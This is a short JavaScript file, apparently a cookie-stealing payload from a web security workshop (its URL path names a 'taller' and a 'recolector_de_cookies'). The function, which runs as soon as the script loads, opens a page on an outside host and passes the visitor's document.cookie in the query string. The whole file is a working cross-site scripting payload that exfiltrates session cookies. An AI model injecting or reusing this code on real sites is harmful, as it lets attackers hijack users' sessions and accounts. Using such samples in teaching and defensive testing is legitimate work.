function enviar() {
  window.open(
    "https://www.appsweb.dev/tallerctc/recolector_de_cookies.php?cookie=" +
      document.cookie,
    "_blank"
  );
}

enviar();
